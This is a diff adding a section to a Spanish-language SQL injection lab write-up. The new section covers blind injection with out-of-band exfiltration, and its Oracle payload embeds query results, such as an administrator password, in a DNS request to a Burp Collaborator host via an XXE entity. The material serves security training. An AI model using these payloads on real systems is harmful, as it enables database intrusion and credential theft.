@@ -802,9 +802,22 @@ Si lo adaptamos a nuestro ejemplo los carateres complicado tenemos que url encod
 TrackingId=test' union SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %25remote%3b]>'),'/l') FROM dual
 ```
 
+## Reto 17:Inyección SQL ciega con exfiltración de datos fuera de banda
 
+Este laboratorio contiene una vulnerabilidad de inyección SQL ciega. La aplicación utiliza una cookie de seguimiento para análisis y realiza una consulta SQL que contiene el valor de la cookie enviada.
 
+La consulta SQL se ejecuta de forma asíncrona y no afecta la respuesta de la aplicación. Sin embargo, se pueden activar interacciones fuera de banda con un dominio externo.
 
+La base de datos contiene una tabla diferente llamada users, con columnas llamadas username y passwordNecesitas explotar la vulnerabilidad de inyección SQL ciega para averiguar la contraseña del administrator.
+
+Para resolver el laboratorio, inicie sesión como administrator. 
+
+De la misma forma que el ejemplo anterior podemos extraer datos de la BD usando el DNS e introduciendo la query dentro 
+teniendo en cuenta que hay que URL encodear los caracteres, por ejemplo para ORACLE:
+
+```
+SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
+```
 
 
 ## ¿Qué es una SQLI ?
